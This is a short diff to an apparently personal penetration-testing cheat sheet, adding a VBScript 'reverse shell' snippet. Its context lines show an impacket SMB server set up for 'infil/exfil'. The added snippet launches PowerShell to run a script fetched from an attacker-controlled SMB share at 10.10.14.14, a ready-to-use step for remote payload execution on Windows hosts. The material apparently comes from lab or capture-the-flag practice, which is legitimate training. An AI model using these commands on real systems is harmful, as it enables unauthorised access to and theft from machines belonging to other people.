@@ -52,3 +52,7 @@ paste in your shell, profit
 
 ## Start SMB for infil/exfil:  
 `$ sudo impacket-smbserver -smb2support GUEST /home/kymb0/Desktop/backup/offshore/toolz`
+
+Rewverse shell vbs
+`Set objShell = CreateObject("Wscript.Shell")
+objShell.Run("powershell.exe -noexit \\10.10.14.14\GUEST\l.ps1")`
